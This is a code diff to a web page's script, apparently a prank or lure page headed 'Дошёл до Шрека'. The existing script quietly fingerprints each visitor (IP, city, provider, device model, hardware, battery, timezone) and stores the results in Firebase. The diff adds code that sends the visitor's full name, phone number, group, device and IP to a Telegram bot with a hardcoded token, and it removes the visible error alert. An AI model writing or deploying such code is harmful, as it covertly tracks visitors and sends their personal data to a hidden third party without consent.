@@ -339,7 +339,7 @@
   }
 </script>
 
-<!-- ====== Сбор данных + сохранение ====== -->
+<!-- ====== Сбор данных + сохранение + Telegram ====== -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import {
@@ -354,6 +354,24 @@
     messagingSenderId: "262830985110",
     appId: "1:262830985110:web:6253b9cd57e767a04b57b7"
   };
+
+  // ===== TELEGRAM УВЕДОМЛЕНИЯ =====
+  const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
+  const TELEGRAM_CHAT_ID = "387069476";
+
+  function sendTelegramNotify(text) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+      })
+    }).catch(err => console.error("Telegram error:", err));
+  }
+  // ==================================
 
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
@@ -393,13 +411,11 @@
       console.warn("IP lookup failed:", e);
     }
 
-    // UA, язык, платформа
     const ua = navigator.userAgent;
     info.userAgent = ua;
     info.language = navigator.language || null;
     info.platform = navigator.platform || null;
 
-    // ОС / браузер / модель
     function parseUA(ua) {
       const r = { os: "unknown", browser: "unknown", device: "desktop", model: null };
       if (/Windows NT 10/.test(ua)) r.os = "Windows 10/11";
@@ -429,23 +445,19 @@
     info.device = p.device;
     info.model = p.model;
 
-    // Экран
     info.screenWidth = screen.width;
     info.screenHeight = screen.height;
     info.pixelRatio = window.devicePixelRatio || 1;
     info.windowWidth = window.innerWidth;
     info.windowHeight = window.innerHeight;
 
-    // Железо
     info.cpuCores = navigator.hardwareConcurrency || null;
     info.deviceMemory = navigator.deviceMemory || null;
 
-    // Сеть
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     info.connectionType = conn ? (conn.effectiveType || conn.type || null) : null;
     info.downlink = conn && conn.downlink ? conn.downlink : null;
 
-    // Батарея
     info.batteryLevel = null;
     info.batteryCharging = null;
     if (navigator.getBattery) {
@@ -456,7 +468,6 @@
       } catch (e) {}
     }
 
-    // Время
     info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     info.localTime = new Date().toISOString();
     info.referrer = document.referrer || "прямой заход";
@@ -485,9 +496,27 @@
 
       await addDoc(collection(db, "visits"), visitData);
       console.log("✅ Визит сохранён в visits:", visitData);
+
+      // ===== Уведомление в Telegram =====
+      const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model]
+        .filter(Boolean).join(" · ") || "—";
+      const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider]
+        .filter(Boolean).join(" · ") || "—";
+      const batteryStr = deviceInfo.batteryLevel != null
+        ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}`
+        : "—";
+
+      sendTelegramNotify(
+        "👀 <b>Дошёл до Шрека</b>\n\n" +
+        "👤 <b>ФИО:</b> " + (fio || "—") + "\n" +
+        "📞 <b>Телефон:</b> " + (phone || "—") + "\n" +
+        "📚 <b>Группа:</b> " + (group || "—") + "\n\n" +
+        "📱 <b>Устройство:</b> " + deviceStr + "\n" +
+        "🌐 <b>IP:</b> " + ipStr + "\n" +
+        "🔋 <b>Заряд:</b> " + batteryStr
+      );
     } catch (err) {
       console.error("❌ Ошибка сохранения визита:", err);
-      alert("Ошибка сохранения: " + err.message);
     }
   }
 
